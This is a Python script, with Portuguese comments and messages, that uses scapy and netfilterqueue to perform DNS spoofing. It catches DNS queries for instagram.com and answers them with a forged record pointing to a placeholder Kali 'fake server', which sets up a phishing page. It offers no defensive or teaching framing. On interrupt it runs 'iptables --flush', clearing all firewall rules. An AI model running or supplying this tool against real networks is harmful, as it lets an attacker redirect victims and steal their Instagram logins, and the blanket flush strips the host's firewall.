from scapy.all import *
from netfilterqueue import NetfilterQueue

target_domain = b"instagram.com."
fake_ip = "<IP KALI>"  # IP do seu Kali/server fake

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSQR):
        qname = scapy_packet[DNSQR].qname
        if target_domain in qname:
            print(f"[+] Spoofing DNS request for {qname.decode()}")
            spoofed_packet = IP(dst=scapy_packet[IP].src, src=scapy_packet[IP].dst) / \
                             UDP(dport=scapy_packet[UDP].sport, sport=53) / \
                             DNS(id=scapy_packet[DNS].id, qr=1, aa=1, qd=scapy_packet[DNS].qd,
                                 an=DNSRR(rrname=qname, ttl=10, rdata=fake_ip))
            packet.set_payload(bytes(spoofed_packet))
    packet.accept()

queue = NetfilterQueue()
queue.bind(0, process_packet)

try:
    print("[*] DNS Spoofing iniciado... Pressione CTRL+C para parar.")
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Interrompido pelo usuário. Limpando iptables...")
    os.system("iptables --flush")
